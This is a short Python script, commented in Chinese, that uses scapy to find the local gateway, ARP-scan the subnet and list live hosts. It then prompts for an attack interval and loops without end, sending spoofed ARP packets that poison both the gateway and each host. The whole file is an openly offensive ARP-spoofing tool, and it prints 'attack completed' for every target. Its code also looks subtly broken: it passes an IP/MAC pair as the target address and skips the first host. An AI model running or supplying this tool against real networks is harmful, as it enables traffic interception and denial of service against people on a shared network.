import os
import time
from scapy.all import *
def scan2spoof():
    cmdcode = 'route print'
    for line in os.popen(cmdcode):
        s = line.strip()
        if s.startswith("0.0.0.0"):
            iplist = s.split()
            wg = iplist[2]  # 网关
            ip = iplist[3]  # ip
    print("ip是：{}".format(ip))
    print("网关是：{}".format(wg))
    arppk = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=wg+"/24")
    ansip, unansip = srp(arppk, timeout=2, verbose=0)
    print("在线主机：{}".format(len(ansip)))
    print("不在线主机：{}".format(len(unansip)))
    ansersip = []
    for s, r in ansip:
        ansersip.append([r.psrc, r.hwsrc])  # ip,mac
    ansersip.sort()
    for ip, mac in ansersip:
        print(ip, "--->", mac)
    ttl = int(input("需攻击时间（毫秒）："))
    sp =ttl/1000
    while True:
        i = 0
        for __count in range((len(ansersip) - 1)):
            i += 1
            vip = ansersip[i]
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=vip, psrc=wg), verbose=0)
            print("ff:ff:ff:ff:ff:ff")
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=wg, psrc=vip), verbose=0)
            print("ff:ff:ff:ff:ff:ff")
            print("对{}攻击完成".format(vip))
            print(" ")
            time.sleep(sp)
if __name__ == "__main__":
    scan2spoof()